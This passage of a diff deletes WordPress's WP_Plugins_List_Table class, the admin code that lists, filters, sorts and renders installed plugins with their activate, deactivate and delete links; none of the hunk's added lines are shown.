@@ -1,872 +1,452 @@
-<?php
-/**
- * List Table API: WP_Plugins_List_Table class
- *
- * @package WordPress
- * @subpackage Administration
- * @since 3.1.0
- */
-
-/**
- * Core class used to implement displaying installed plugins in a list table.
- *
- * @since 3.1.0
- * @access private
- *
- * @see WP_List_Table
- */
-class WP_Plugins_List_Table extends WP_List_Table {
-
-	/**
-	 * Constructor.
-	 *
-	 * @since 3.1.0
-	 *
-	 * @see WP_List_Table::__construct() for more information on default arguments.
-	 *
-	 * @global string $status
-	 * @global int    $page
-	 *
-	 * @param array $args An associative array of arguments.
-	 */
-	public function __construct( $args = array() ) {
-		global $status, $page;
-
-		parent::__construct( array(
-			'plural' => 'plugins',
-			'screen' => isset( $args['screen'] ) ? $args['screen'] : null,
-		) );
-
-		$status = 'all';
-		if ( isset( $_REQUEST['plugin_status'] ) && in_array( $_REQUEST['plugin_status'], array( 'active', 'inactive', 'recently_activated', 'upgrade', 'mustuse', 'dropins', 'search' ) ) )
-			$status = $_REQUEST['plugin_status'];
-
-		if ( isset($_REQUEST['s']) )
-			$_SERVER['REQUEST_URI'] = add_query_arg('s', wp_unslash($_REQUEST['s']) );
-
-		$page = $this->get_pagenum();
-	}
-
-	/**
-	 * @return array
-	 */
-	protected function get_table_classes() {
-		return array( 'widefat', $this->_args['plural'] );
-	}
-
-	/**
-	 * @return bool
-	 */
-	public function ajax_user_can() {
-		return current_user_can('activate_plugins');
-	}
-
-	/**
-	 *
-	 * @global string $status
-	 * @global array  $plugins
-	 * @global array  $totals
-	 * @global int    $page
-	 * @global string $orderby
-	 * @global string $order
-	 * @global string $s
-	 */
-	public function prepare_items() {
-		global $status, $plugins, $totals, $page, $orderby, $order, $s;
-
-		wp_reset_vars( array( 'orderby', 'order' ) );
-
-		/**
-		 * Filters the full array of plugins to list in the Plugins list table.
-		 *
-		 * @since 3.0.0
-		 *
-		 * @see get_plugins()
-		 *
-		 * @param array $all_plugins An array of plugins to display in the list table.
-		 */
-		$all_plugins = apply_filters( 'all_plugins', get_plugins() );
-
-		$plugins = array(
-			'all'                => $all_plugins,
-			'search'             => array(),
-			'active'             => array(),
-			'inactive'           => array(),
-			'recently_activated' => array(),
-			'upgrade'            => array(),
-			'mustuse'            => array(),
-			'dropins'            => array(),
-		);
-
-		$screen = $this->screen;
-
-		if ( ! is_multisite() || ( $screen->in_admin( 'network' ) && current_user_can( 'manage_network_plugins' ) ) ) {
-
-			/**
-			 * Filters whether to display the advanced plugins list table.
-			 *
-			 * There are two types of advanced plugins - must-use and drop-ins -
-			 * which can be used in a single site or Multisite network.
-			 *
-			 * The $type parameter allows you to differentiate between the type of advanced
-			 * plugins to filter the display of. Contexts include 'mustuse' and 'dropins'.
-			 *
-			 * @since 3.0.0
-			 *
-			 * @param bool   $show Whether to show the advanced plugins for the specified
-			 *                     plugin type. Default true.
-			 * @param string $type The plugin type. Accepts 'mustuse', 'dropins'.
-			 */
-			if ( apply_filters( 'show_advanced_plugins', true, 'mustuse' ) ) {
-				$plugins['mustuse'] = get_mu_plugins();
-			}
-
-			/** This action is documented in wp-admin/includes/class-wp-plugins-list-table.php */
-			if ( apply_filters( 'show_advanced_plugins', true, 'dropins' ) )
-				$plugins['dropins'] = get_dropins();
-
-			if ( current_user_can( 'update_plugins' ) ) {
-				$current = get_site_transient( 'update_plugins' );
-				foreach ( (array) $plugins['all'] as $plugin_file => $plugin_data ) {
-					if ( isset( $current->response[ $plugin_file ] ) ) {
-						$plugins['all'][ $plugin_file ]['update'] = true;
-						$plugins['upgrade'][ $plugin_file ] = $plugins['all'][ $plugin_file ];
-					}
-				}
-			}
-		}
-
-		if ( ! $screen->in_admin( 'network' ) ) {
-			$show = current_user_can( 'manage_network_plugins' );
-			/**
-			 * Filters whether to display network-active plugins alongside plugins active for the current site.
-			 *
-			 * This also controls the display of inactive network-only plugins (plugins with
-			 * "Network: true" in the plugin header).
-			 *
-			 * Plugins cannot be network-activated or network-deactivated from this screen.
-			 *
-			 * @since 4.4.0
-			 *
-			 * @param bool $show Whether to show network-active plugins. Default is whether the current
-			 *                   user can manage network plugins (ie. a Super Admin).
-			 */
-			$show_network_active = apply_filters( 'show_network_active_plugins', $show );
-		}
-
-		set_transient( 'plugin_slugs', array_keys( $plugins['all'] ), DAY_IN_SECONDS );
-
-		if ( $screen->in_admin( 'network' ) ) {
-			$recently_activated = get_site_option( 'recently_activated', array() );
-		} else {
-			$recently_activated = get_option( 'recently_activated', array() );
-		}
-
-		foreach ( $recently_activated as $key => $time ) {
-			if ( $time + WEEK_IN_SECONDS < time() ) {
-				unset( $recently_activated[$key] );
-			}
-		}
-
-		if ( $screen->in_admin( 'network' ) ) {
-			update_site_option( 'recently_activated', $recently_activated );
-		} else {
-			update_option( 'recently_activated', $recently_activated );
-		}
-
-		$plugin_info = get_site_transient( 'update_plugins' );
-
-		foreach ( (array) $plugins['all'] as $plugin_file => $plugin_data ) {
-			// Extra info if known. array_merge() ensures $plugin_data has precedence if keys collide.
-			if ( isset( $plugin_info->response[ $plugin_file ] ) ) {
-				$plugins['all'][ $plugin_file ] = $plugin_data = array_merge( (array) $plugin_info->response[ $plugin_file ], $plugin_data );
-				// Make sure that $plugins['upgrade'] also receives the extra info since it is used on ?plugin_status=upgrade
-				if ( isset( $plugins['upgrade'][ $plugin_file ] ) ) {
-					$plugins['upgrade'][ $plugin_file ] = $plugin_data = array_merge( (array) $plugin_info->response[ $plugin_file ], $plugin_data );
-				}
-
-			} elseif ( isset( $plugin_info->no_update[ $plugin_file ] ) ) {
-				$plugins['all'][ $plugin_file ] = $plugin_data = array_merge( (array) $plugin_info->no_update[ $plugin_file ], $plugin_data );
-				// Make sure that $plugins['upgrade'] also receives the extra info since it is used on ?plugin_status=upgrade
-				if ( isset( $plugins['upgrade'][ $plugin_file ] ) ) {
-					$plugins['upgrade'][ $plugin_file ] = $plugin_data = array_merge( (array) $plugin_info->no_update[ $plugin_file ], $plugin_data );
-				}
-			}
-
-			// Filter into individual sections
-			if ( is_multisite() && ! $screen->in_admin( 'network' ) && is_network_only_plugin( $plugin_file ) && ! is_plugin_active( $plugin_file ) ) {
-				if ( $show_network_active ) {
-					// On the non-network screen, show inactive network-only plugins if allowed
-					$plugins['inactive'][ $plugin_file ] = $plugin_data;
-				} else {
-					// On the non-network screen, filter out network-only plugins as long as they're not individually active
-					unset( $plugins['all'][ $plugin_file ] );
-				}
-			} elseif ( ! $screen->in_admin( 'network' ) && is_plugin_active_for_network( $plugin_file ) ) {
-				if ( $show_network_active ) {
-					// On the non-network screen, show network-active plugins if allowed
-					$plugins['active'][ $plugin_file ] = $plugin_data;
-				} else {
-					// On the non-network screen, filter out network-active plugins
-					unset( $plugins['all'][ $plugin_file ] );
-				}
-			} elseif ( ( ! $screen->in_admin( 'network' ) && is_plugin_active( $plugin_file ) )
-				|| ( $screen->in_admin( 'network' ) && is_plugin_active_for_network( $plugin_file ) ) ) {
-				// On the non-network screen, populate the active list with plugins that are individually activated
-				// On the network-admin screen, populate the active list with plugins that are network activated
-				$plugins['active'][ $plugin_file ] = $plugin_data;
-			} else {
-				if ( isset( $recently_activated[ $plugin_file ] ) ) {
-					// Populate the recently activated list with plugins that have been recently activated
-					$plugins['recently_activated'][ $plugin_file ] = $plugin_data;
-				}
-				// Populate the inactive list with plugins that aren't activated
-				$plugins['inactive'][ $plugin_file ] = $plugin_data;
-			}
-		}
-
-		if ( strlen( $s ) ) {
-			$status = 'search';
-			$plugins['search'] = array_filter( $plugins['all'], array( $this, '_search_callback' ) );
-		}
-
-		$totals = array();
-		foreach ( $plugins as $type => $list )
-			$totals[ $type ] = count( $list );
-
-		if ( empty( $plugins[ $status ] ) && !in_array( $status, array( 'all', 'search' ) ) )
-			$status = 'all';
-
-		$this->items = array();
-		foreach ( $plugins[ $status ] as $plugin_file => $plugin_data ) {
-			// Translate, Don't Apply Markup, Sanitize HTML
-			$this->items[$plugin_file] = _get_plugin_data_markup_translate( $plugin_file, $plugin_data, false, true );
-		}
-
-		$total_this_page = $totals[ $status ];
-
-		$js_plugins = array();
-		foreach ( $plugins as $key => $list ) {
-			$js_plugins[ $key ] = array_keys( (array) $list );
-		}
-
-		wp_localize_script( 'updates', '_wpUpdatesItemCounts', array(
-			'plugins' => $js_plugins,
-			'totals'  => wp_get_update_data(),
-		) );
-
-		if ( ! $orderby ) {
-			$orderby = 'Name';
-		} else {
-			$orderby = ucfirst( $orderby );
-		}
-
-		$order = strtoupper( $order );
-
-		uasort( $this->items, array( $this, '_order_callback' ) );
-
-		$plugins_per_page = $this->get_items_per_page( str_replace( '-', '_', $screen->id . '_per_page' ), 999 );
-
-		$start = ( $page - 1 ) * $plugins_per_page;
-
-		if ( $total_this_page > $plugins_per_page )
-			$this->items = array_slice( $this->items, $start, $plugins_per_page );
-
-		$this->set_pagination_args( array(
-			'total_items' => $total_this_page,
-			'per_page' => $plugins_per_page,
-		) );
-	}
-
-	/**
-	 * @global string $s URL encoded search term.
-	 *
-	 * @param array $plugin
-	 * @return bool
-	 */
-	public function _search_callback( $plugin ) {
-		global $s;
-
-		foreach ( $plugin as $value ) {
-			if ( is_string( $value ) && false !== stripos( strip_tags( $value ), urldecode( $s ) ) ) {
-				return true;
-			}
-		}
-
-		return false;
-	}
-
-	/**
-	 * @global string $orderby
-	 * @global string $order
-	 * @param array $plugin_a
-	 * @param array $plugin_b
-	 * @return int
-	 */
-	public function _order_callback( $plugin_a, $plugin_b ) {
-		global $orderby, $order;
-
-		$a = $plugin_a[$orderby];
-		$b = $plugin_b[$orderby];
-
-		if ( $a == $b )
-			return 0;
-
-		if ( 'DESC' === $order ) {
-			return strcasecmp( $b, $a );
-		} else {
-			return strcasecmp( $a, $b );
-		}
-	}
-
-	/**
-	 *
-	 * @global array $plugins
-	 */
-	public function no_items() {
-		global $plugins;
-
-		if ( ! empty( $_REQUEST['s'] ) ) {
-			$s = esc_html( wp_unslash( $_REQUEST['s'] ) );
-
-			printf( __( 'No plugins found for &#8220;%s&#8221;.' ), $s );
-
-			// We assume that somebody who can install plugins in multisite is experienced enough to not need this helper link.
-			if ( ! is_multisite() && current_user_can( 'install_plugins' ) ) {
-				echo ' <a href="' . esc_url( admin_url( 'plugin-install.php?tab=search&s=' . urlencode( $s ) ) ) . '">' . __( 'Search for plugins in the WordPress Plugin Directory.' ) . '</a>';
-			}
-		} elseif ( ! empty( $plugins['all'] ) )
-			_e( 'No plugins found.' );
-		else
-			_e( 'You do not appear to have any plugins available at this time.' );
-	}
-
-	/**
-	 * Displays the search box.
-	 *
-	 * @since 4.6.0
-	 *
-	 * @param string $text     The 'submit' button label.
-	 * @param string $input_id ID attribute value for the search input field.
-	 */
-	public function search_box( $text, $input_id ) {
-		if ( empty( $_REQUEST['s'] ) && ! $this->has_items() ) {
-			return;
-		}
-
-		$input_id = $input_id . '-search-input';
-
-		if ( ! empty( $_REQUEST['orderby'] ) ) {
-			echo '<input type="hidden" name="orderby" value="' . esc_attr( $_REQUEST['orderby'] ) . '" />';
-		}
-		if ( ! empty( $_REQUEST['order'] ) ) {
-			echo '<input type="hidden" name="order" value="' . esc_attr( $_REQUEST['order'] ) . '" />';
-		}
-		?>
-		<p class="search-box">
-			<label class="screen-reader-text" for="<?php echo esc_attr( $input_id ); ?>"><?php echo $text; ?>:</label>
-			<input type="search" id="<?php echo esc_attr( $input_id ); ?>" class="wp-filter-search" name="s" value="<?php _admin_search_query(); ?>" placeholder="<?php esc_attr_e( 'Search installed plugins...' ); ?>"/>
-			<?php submit_button( $text, 'hide-if-js', '', false, array( 'id' => 'search-submit' ) ); ?>
-		</p>
-		<?php
-	}
-
-	/**
-	 *
-	 * @global string $status
-	 * @return array
-	 */
-	public function get_columns() {
-		global $status;
-
-		return array(
-			'cb'          => !in_array( $status, array( 'mustuse', 'dropins' ) ) ? '<input type="checkbox" />' : '',
-			'name'        => __( 'Plugin' ),
-			'description' => __( 'Description' ),
-		);
-	}
-
-	/**
-	 * @return array
-	 */
-	protected function get_sortable_columns() {
-		return array();
-	}
-
-	/**
-	 *
-	 * @global array $totals
-	 * @global string $status
-	 * @return array
-	 */
-	protected function get_views() {
-		global $totals, $status;
-
-		$status_links = array();
-		foreach ( $totals as $type => $count ) {
-			if ( !$count )
-				continue;
-
-			switch ( $type ) {
-				case 'all':
-					$text = _nx( 'All <span class="count">(%s)</span>', 'All <span class="count">(%s)</span>', $count, 'plugins' );
-					break;
-				case 'active':
-					$text = _n( 'Active <span class="count">(%s)</span>', 'Active <span class="count">(%s)</span>', $count );
-					break;
-				case 'recently_activated':
-					$text = _n( 'Recently Active <span class="count">(%s)</span>', 'Recently Active <span class="count">(%s)</span>', $count );
-					break;
-				case 'inactive':
-					$text = _n( 'Inactive <span class="count">(%s)</span>', 'Inactive <span class="count">(%s)</span>', $count );
-					break;
-				case 'mustuse':
-					$text = _n( 'Must-Use <span class="count">(%s)</span>', 'Must-Use <span class="count">(%s)</span>', $count );
-					break;
-				case 'dropins':
-					$text = _n( 'Drop-ins <span class="count">(%s)</span>', 'Drop-ins <span class="count">(%s)</span>', $count );
-					break;
-				case 'upgrade':
-					$text = _n( 'Update Available <span class="count">(%s)</span>', 'Update Available <span class="count">(%s)</span>', $count );
-					break;
-			}
-
-			if ( 'search' !== $type ) {
-				$status_links[$type] = sprintf( "<a href='%s'%s>%s</a>",
-					add_query_arg('plugin_status', $type, 'plugins.php'),
-					( $type === $status ) ? ' class="current" aria-current="page"' : '',
-					sprintf( $text, number_format_i18n( $count ) )
-					);
-			}
-		}
-
-		return $status_links;
-	}
-
-	/**
-	 *
-	 * @global string $status
-	 * @return array
-	 */
-	protected function get_bulk_actions() {
-		global $status;
-
-		$actions = array();
-
-		if ( 'active' != $status )
-			$actions['activate-selected'] = $this->screen->in_admin( 'network' ) ? __( 'Network Activate' ) : __( 'Activate' );
-
-		if ( 'inactive' != $status && 'recent' != $status )
-			$actions['deactivate-selected'] = $this->screen->in_admin( 'network' ) ? __( 'Network Deactivate' ) : __( 'Deactivate' );
-
-		if ( !is_multisite() || $this->screen->in_admin( 'network' ) ) {
-			if ( current_user_can( 'update_plugins' ) )
-				$actions['update-selected'] = __( 'Update' );
-			if ( current_user_can( 'delete_plugins' ) && ( 'active' != $status ) )
-				$actions['delete-selected'] = __( 'Delete' );
-		}
-
-		return $actions;
-	}
-
-	/**
-	 * @global string $status
-	 * @param string $which
-	 */
-	public function bulk_actions( $which = '' ) {
-		global $status;
-
-		if ( in_array( $status, array( 'mustuse', 'dropins' ) ) )
-			return;
-
-		parent::bulk_actions( $which );
-	}
-
-	/**
-	 * @global string $status
-	 * @param string $which
-	 */
-	protected function extra_tablenav( $which ) {
-		global $status;
-
-		if ( ! in_array($status, array('recently_activated', 'mustuse', 'dropins') ) )
-			return;
-
-		echo '<div class="alignleft actions">';
-
-		if ( 'recently_activated' == $status ) {
-			submit_button( __( 'Clear List' ), '', 'clear-recent-list', false );
-		} elseif ( 'top' === $which && 'mustuse' === $status ) {
-			/* translators: %s: mu-plugins directory name */
-			echo '<p>' . sprintf( __( 'Files in the %s directory are executed automatically.' ),
-				'<code>' . str_replace( ABSPATH, '/', WPMU_PLUGIN_DIR ) . '</code>'
-			) . '</p>';
-		} elseif ( 'top' === $which && 'dropins' === $status ) {
-			/* translators: %s: wp-content directory name */
-			echo '<p>' . sprintf( __( 'Drop-ins are advanced plugins in the %s directory that replace WordPress functionality when present.' ),
-				'<code>' . str_replace( ABSPATH, '', WP_CONTENT_DIR ) . '</code>'
-			) . '</p>';
-		}
-		echo '</div>';
-	}
-
-	/**
-	 * @return string
-	 */
-	public function current_action() {
-		if ( isset($_POST['clear-recent-list']) )
-			return 'clear-recent-list';
-
-		return parent::current_action();
-	}
-
-	/**
-	 *
-	 * @global string $status
-	 */
-	public function display_rows() {
-		global $status;
-
-		if ( is_multisite() && ! $this->screen->in_admin( 'network' ) && in_array( $status, array( 'mustuse', 'dropins' ) ) )
-			return;
-
-		foreach ( $this->items as $plugin_file => $plugin_data )
-			$this->single_row( array( $plugin_file, $plugin_data ) );
-	}
-
-	/**
-	 * @global string $status
-	 * @global int $page
-	 * @global string $s
-	 * @global array $totals
-	 *
-	 * @param array $item
-	 */
-	public function single_row( $item ) {
-		global $status, $page, $s, $totals;
-
-		list( $plugin_file, $plugin_data ) = $item;
-		$context = $status;
-		$screen = $this->screen;
-
-		// Pre-order.
-		$actions = array(
-			'deactivate' => '',
-			'activate' => '',
-			'details' => '',
-			'delete' => '',
-		);
-
-		// Do not restrict by default
-		$restrict_network_active = false;
-		$restrict_network_only = false;
-
-		if ( 'mustuse' === $context ) {
-			$is_active = true;
-		} elseif ( 'dropins' === $context ) {
-			$dropins = _get_dropins();
-			$plugin_name = $plugin_file;
-			if ( $plugin_file != $plugin_data['Name'] )
-				$plugin_name .= '<br/>' . $plugin_data['Name'];
-			if ( true === ( $dropins[ $plugin_file ][1] ) ) { // Doesn't require a constant
-				$is_active = true;
-				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . '</strong></p>';
-			} elseif ( defined( $dropins[ $plugin_file ][1] ) && constant( $dropins[ $plugin_file ][1] ) ) { // Constant is true
-				$is_active = true;
-				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . '</strong></p>';
-			} else {
-				$is_active = false;
-				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . ' <span class="error-message">' . __( 'Inactive:' ) . '</span></strong> ' .
-					/* translators: 1: drop-in constant name, 2: wp-config.php */
-					sprintf( __( 'Requires %1$s in %2$s file.' ),
-						"<code>define('" . $dropins[ $plugin_file ][1] . "', true);</code>",
-						'<code>wp-config.php</code>'
-					) . '</p>';
-			}
-			if ( $plugin_data['Description'] )
-				$description .= '<p>' . $plugin_data['Description'] . '</p>';
-		} else {
-			if ( $screen->in_admin( 'network' ) ) {
-				$is_active = is_plugin_active_for_network( $plugin_file );
-			} else {
-				$is_active = is_plugin_active( $plugin_file );
-				$restrict_network_active = ( is_multisite() && is_plugin_active_for_network( $plugin_file ) );
-				$restrict_network_only = ( is_multisite() && is_network_only_plugin( $plugin_file ) && ! $is_active );
-			}
-
-			if ( $screen->in_admin( 'network' ) ) {
-				if ( $is_active ) {
-					if ( current_user_can( 'manage_network_plugins' ) ) {
-						/* translators: %s: plugin name */
-						$actions['deactivate'] = '<a href="' . wp_nonce_url( 'plugins.php?action=deactivate&amp;plugin=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'deactivate-plugin_' . $plugin_file ) . '" aria-label="' . esc_attr( sprintf( _x( 'Network Deactivate %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Network Deactivate' ) . '</a>';
-						}
-				} else {
-					if ( current_user_can( 'manage_network_plugins' ) ) {
-						/* translators: %s: plugin name */
-						$actions['activate'] = '<a href="' . wp_nonce_url( 'plugins.php?action=activate&amp;plugin=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'activate-plugin_' . $plugin_file ) . '" class="edit" aria-label="' . esc_attr( sprintf( _x( 'Network Activate %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Network Activate' ) . '</a>';
-					}
-					if ( current_user_can( 'delete_plugins' ) && ! is_plugin_active( $plugin_file ) ) {
-						/* translators: %s: plugin name */
-						$actions['delete'] = '<a href="' . wp_nonce_url( 'plugins.php?action=delete-selected&amp;checked[]=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'bulk-plugins' ) . '" class="delete" aria-label="' . esc_attr( sprintf( _x( 'Delete %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Delete' ) . '</a>';
-					}
-				}
-			} else {
-				if ( $restrict_network_active ) {
-					$actions = array(
-						'network_active' => __( 'Network Active' ),
-					);
-				} elseif ( $restrict_network_only ) {
-					$actions = array(
-						'network_only' => __( 'Network Only' ),
-					);
-				} elseif ( $is_active ) {
-					if ( current_user_can( 'deactivate_plugin', $plugin_file ) ) {
-						/* translators: %s: plugin name */
-						$actions['deactivate'] = '<a href="' . wp_nonce_url( 'plugins.php?action=deactivate&amp;plugin=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'deactivate-plugin_' . $plugin_file ) . '" aria-label="' . esc_attr( sprintf( _x( 'Deactivate %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Deactivate' ) . '</a>';
-					}
-				} else {
-					if ( current_user_can( 'activate_plugin', $plugin_file ) ) {
-						/* translators: %s: plugin name */
-						$actions['activate'] = '<a href="' . wp_nonce_url( 'plugins.php?action=activate&amp;plugin=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'activate-plugin_' . $plugin_file ) . '" class="edit" aria-label="' . esc_attr( sprintf( _x( 'Activate %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Activate' ) . '</a>';
-					}
-
-					if ( ! is_multisite() && current_user_can( 'delete_plugins' ) ) {
-						/* translators: %s: plugin name */
-						$actions['delete'] = '<a href="' . wp_nonce_url( 'plugins.php?action=delete-selected&amp;checked[]=' . urlencode( $plugin_file ) . '&amp;plugin_status=' . $context . '&amp;paged=' . $page . '&amp;s=' . $s, 'bulk-plugins' ) . '" class="delete" aria-label="' . esc_attr( sprintf( _x( 'Delete %s', 'plugin' ), $plugin_data['Name'] ) ) . '">' . __( 'Delete' ) . '</a>';
-					}
-				} // end if $is_active
-
-			 } // end if $screen->in_admin( 'network' )
-
-		} // end if $context
-
-		$actions = array_filter( $actions );
-
-		if ( $screen->in_admin( 'network' ) ) {
-
-			/**
-			 * Filters the action links displayed for each plugin in the Network Admin Plugins list table.
-			 *
-			 * @since 3.1.0
-			 *
-			 * @param array  $actions     An array of plugin action links. By default this can include 'activate',
-			 *                            'deactivate', and 'delete'.
-			 * @param string $plugin_file Path to the plugin file relative to the plugins directory.
-			 * @param array  $plugin_data An array of plugin data. See `get_plugin_data()`.
-			 * @param string $context     The plugin context. By default this can include 'all', 'active', 'inactive',
-			 *                            'recently_activated', 'upgrade', 'mustuse', 'dropins', and 'search'.
-			 */
-			$actions = apply_filters( 'network_admin_plugin_action_links', $actions, $plugin_file, $plugin_data, $context );
-
-			/**
-			 * Filters the list of action links displayed for a specific plugin in the Network Admin Plugins list table.
-			 *
-			 * The dynamic portion of the hook name, `$plugin_file`, refers to the path
-			 * to the plugin file, relative to the plugins directory.
-			 *
-			 * @since 3.1.0
-			 *
-			 * @param array  $actions     An array of plugin action links. By default this can include 'activate',
-			 *                            'deactivate', and 'delete'.
-			 * @param string $plugin_file Path to the plugin file relative to the plugins directory.
-			 * @param array  $plugin_data An array of plugin data. See `get_plugin_data()`.
-			 * @param string $context     The plugin context. By default this can include 'all', 'active', 'inactive',
-			 *                            'recently_activated', 'upgrade', 'mustuse', 'dropins', and 'search'.
-			 */
-			$actions = apply_filters( "network_admin_plugin_action_links_{$plugin_file}", $actions, $plugin_file, $plugin_data, $context );
-
-		} else {
-
-			/**
-			 * Filters the action links displayed for each plugin in the Plugins list table.
-			 *
-			 * @since 2.5.0
-			 * @since 2.6.0 The `$context` parameter was added.
-			 * @since 4.9.0 The 'Edit' link was removed from the list of action links.
-			 *
-			 * @param array  $actions     An array of plugin action links. By default this can include 'activate',
-			 *                            'deactivate', and 'delete'. With Multisite active this can also include
-			 *                            'network_active' and 'network_only' items.
-			 * @param string $plugin_file Path to the plugin file relative to the plugins directory.
-			 * @param array  $plugin_data An array of plugin data. See `get_plugin_data()`.
-			 * @param string $context     The plugin context. By default this can include 'all', 'active', 'inactive',
-			 *                            'recently_activated', 'upgrade', 'mustuse', 'dropins', and 'search'.
-			 */
-			$actions = apply_filters( 'plugin_action_links', $actions, $plugin_file, $plugin_data, $context );
-
-			/**
-			 * Filters the list of action links displayed for a specific plugin in the Plugins list table.
-			 *
-			 * The dynamic portion of the hook name, `$plugin_file`, refers to the path
-			 * to the plugin file, relative to the plugins directory.
-			 *
-			 * @since 2.7.0
-			 * @since 4.9.0 The 'Edit' link was removed from the list of action links.
-			 *
-			 * @param array  $actions     An array of plugin action links. By default this can include 'activate',
-			 *                            'deactivate', and 'delete'. With Multisite active this can also include
-			 *                            'network_active' and 'network_only' items.
-			 * @param string $plugin_file Path to the plugin file relative to the plugins directory.
-			 * @param array  $plugin_data An array of plugin data. See `get_plugin_data()`.
-			 * @param string $context     The plugin context. By default this can include 'all', 'active', 'inactive',
-			 *                            'recently_activated', 'upgrade', 'mustuse', 'dropins', and 'search'.
-			 */
-			$actions = apply_filters( "plugin_action_links_{$plugin_file}", $actions, $plugin_file, $plugin_data, $context );
-
-		}
-
-		$class = $is_active ? 'active' : 'inactive';
-		$checkbox_id =  "checkbox_" . md5($plugin_data['Name']);
-		if ( $restrict_network_active || $restrict_network_only || in_array( $status, array( 'mustuse', 'dropins' ) ) ) {
-			$checkbox = '';
-		} else {
-			$checkbox = "<label class='screen-reader-text' for='" . $checkbox_id . "' >" . sprintf( __( 'Select %s' ), $plugin_data['Name'] ) . "</label>"
-				. "<input type='checkbox' name='checked[]' value='" . esc_attr( $plugin_file ) . "' id='" . $checkbox_id . "' />";
-		}
-		if ( 'dropins' != $context ) {
-			$description = '<p>' . ( $plugin_data['Description'] ? $plugin_data['Description'] : '&nbsp;' ) . '</p>';
-			$plugin_name = $plugin_data['Name'];
-		}
-
-		if ( ! empty( $totals['upgrade'] ) && ! empty( $plugin_data['update'] ) )
-			$class .= ' update';
-
-		$plugin_slug = isset( $plugin_data['slug'] ) ? $plugin_data['slug'] : sanitize_title( $plugin_name );
-		printf( '<tr class="%s" data-slug="%s" data-plugin="%s">',
-			esc_attr( $class ),
-			esc_attr( $plugin_slug ),
-			esc_attr( $plugin_file )
-		);
-
-		list( $columns, $hidden, $sortable, $primary ) = $this->get_column_info();
-
-		foreach ( $columns as $column_name => $column_display_name ) {
-			$extra_classes = '';
-			if ( in_array( $column_name, $hidden ) ) {
-				$extra_classes = ' hidden';
-			}
-
-			switch ( $column_name ) {
-				case 'cb':
-					echo "<th scope='row' class='check-column'>$checkbox</th>";
-					break;
-				case 'name':
-					echo "<td class='plugin-title column-primary'><strong>$plugin_name</strong>";
-					echo $this->row_actions( $actions, true );
-					echo "</td>";
-					break;
-				case 'description':
-					$classes = 'column-description desc';
-
-					echo "<td class='$classes{$extra_classes}'>
-						<div class='plugin-description'>$description</div>
-						<div class='$class second plugin-version-author-uri'>";
-
-					$plugin_meta = array();
-					if ( !empty( $plugin_data['Version'] ) )
-						$plugin_meta[] = sprintf( __( 'Version %s' ), $plugin_data['Version'] );
-					if ( !empty( $plugin_data['Author'] ) ) {
-						$author = $plugin_data['Author'];
-						if ( !empty( $plugin_data['AuthorURI'] ) )
-							$author = '<a href="' . $plugin_data['AuthorURI'] . '">' . $plugin_data['Author'] . '</a>';
-						$plugin_meta[] = sprintf( __( 'By %s' ), $author );
-					}
-
-					// Details link using API info, if available
-					if ( isset( $plugin_data['slug'] ) && current_user_can( 'install_plugins' ) ) {
-						$plugin_meta[] = sprintf( '<a href="%s" class="thickbox open-plugin-details-modal" aria-label="%s" data-title="%s">%s</a>',
-							esc_url( network_admin_url( 'plugin-install.php?tab=plugin-information&plugin=' . $plugin_data['slug'] .
-								'&TB_iframe=true&width=600&height=550' ) ),
-							esc_attr( sprintf( __( 'More information about %s' ), $plugin_name ) ),
-							esc_attr( $plugin_name ),
-							__( 'View details' )
-						);
-					} elseif ( ! empty( $plugin_data['PluginURI'] ) ) {
-						$plugin_meta[] = sprintf( '<a href="%s">%s</a>',
-							esc_url( $plugin_data['PluginURI'] ),
-							__( 'Visit plugin site' )
-						);
-					}
-
-					/**
-					 * Filters the array of row meta for each plugin in the Plugins list table.
-					 *
-					 * @since 2.8.0
-					 *
-					 * @param array  $plugin_meta An array of the plugin's metadata,
-					 *                            including the version, author,
-					 *                            author URI, and plugin URI.
-					 * @param string $plugin_file Path to the plugin file, relative to the plugins directory.
-					 * @param array  $plugin_data An array of plugin data.
-					 * @param string $status      Status of the plugin. Defaults are 'All', 'Active',
-					 *                            'Inactive', 'Recently Activated', 'Upgrade', 'Must-Use',
-					 *                            'Drop-ins', 'Search'.
-					 */
-					$plugin_meta = apply_filters( 'plugin_row_meta', $plugin_meta, $plugin_file, $plugin_data, $status );
-					echo implode( ' | ', $plugin_meta );
-
-					echo "</div></td>";
-					break;
-				default:
-					$classes = "$column_name column-$column_name $class";
-
-					echo "<td class='$classes{$extra_classes}'>";
-
-					/**
-					 * Fires inside each custom column of the Plugins list table.
-					 *
-					 * @since 3.1.0
-					 *
-					 * @param string $column_name Name of the column.
-					 * @param string $plugin_file Path to the plugin file.
-					 * @param array  $plugin_data An array of plugin data.
-					 */
-					do_action( 'manage_plugins_custom_column', $column_name, $plugin_file, $plugin_data );
-
-					echo "</td>";
-			}
-		}
-
-		echo "</tr>";
-
-		/**
-		 * Fires after each row in the Plugins list table.
-		 *
-		 * @since 2.3.0
-		 *
-		 * @param string $plugin_file Path to the plugin file, relative to the plugins directory.
-		 * @param array  $plugin_data An array of plugin data.
-		 * @param string $status      Status of the plugin. Defaults are 'All', 'Active',
-		 *                            'Inactive', 'Recently Activated', 'Upgrade', 'Must-Use',
-		 *                            'Drop-ins', 'Search'.
-		 */
-		do_action( 'after_plugin_row', $plugin_file, $plugin_data, $status );
-
-		/**
-		 * Fires after each specific row in the Plugins list table.
-		 *
-		 * The dynamic portion of the hook name, `$plugin_file`, refers to the path
-		 * to the plugin file, relative to the plugins directory.
-		 *
-		 * @since 2.7.0
-		 *
